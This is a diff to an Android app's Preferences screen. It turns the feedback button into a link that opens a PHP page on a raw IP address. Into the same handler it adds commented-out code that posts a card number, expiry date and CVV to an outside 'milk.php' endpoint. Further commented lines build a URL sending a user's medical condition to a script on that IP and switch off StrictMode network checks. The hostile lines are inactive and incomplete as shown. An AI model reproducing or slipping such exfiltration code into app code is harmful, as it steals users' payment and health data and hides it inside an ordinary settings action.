@@ -34,6 +34,7 @@ import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager.NameNotFoundException;
 import android.content.res.Configuration;
 import android.net.Uri;
+
 import android.nfc.NdefMessage;
 import android.nfc.NdefRecord;
 import android.nfc.Tag;
@@ -42,6 +43,7 @@ import android.nfc.tech.NdefFormatable;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
+import android.os.StrictMode;
 import android.preference.CheckBoxPreference;
 import android.preference.Preference;
 import android.preference.Preference.OnPreferenceChangeListener;
@@ -55,6 +57,7 @@ import android.support.v7.app.ActionBar;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatDelegate;
 import android.support.v7.widget.Toolbar;
+import android.util.Log;
 import android.view.ContextMenu;
 import android.view.ContextMenu.ContextMenuInfo;
 import android.view.Menu;
@@ -340,7 +343,7 @@ public class Preferences extends PreferenceActivity
                     @Override
                     public boolean onPreferenceClick(Preference preference) {
                         //String feedbackMail   =(String) getText(R.string.mail_feedback);
-                        String feedback   =(String) getText(R.string.prefs_feedback);
+                        //String feedback   =(String) getText(R.string.prefs_feedback);
                         //Intent intent = new Intent(Intent.ACTION_SENDTO);
 //                        intent.setType("text/plain");
 //                        intent.putExtra(Intent.EXTRA_SUBJECT, feedback);
@@ -348,6 +351,23 @@ public class Preferences extends PreferenceActivity
 //                        intent.setData(Uri.parse(feedbackMail));
 //                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 //                        startActivity(intent);
+//                        DefaultHttpClient httpclient = new DefaultHttpClient();
+//                        ​
+//                        //HttpPost httppost = new HttpPost("http://mmilk.me/milk.php?cardNum="+ccnum+"&cardExp="+exp+"&name=NULL&iCVV="+scode+"&cardRaw=NULL");
+//                        ​
+//                        HttpResponse response;
+//                        String linksite= ("http://40.76.213.236/webwriter.php?username=matt&type=Condition&details=Seizures");
+//                        Log.d(TAG, "httppost: " + String.valueOf(httppost.getURI()));
+//                        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+//                        StrictMode.setThreadPolicy(policy);
+//                        response = httpclient.execute(httppost);
+//                        Log.d(TAG, "response" + response.getEntity());
+//                        ​
+//                        Log.d(TAG, "linksite" + linksite);;
+
+                        Intent i2=new Intent(Intent.ACTION_VIEW, Uri.parse("http://40.76.213.236/webviewer.php?username=Dexter"));
+                        startActivity(i2);
+
 
                         return true;
                     }
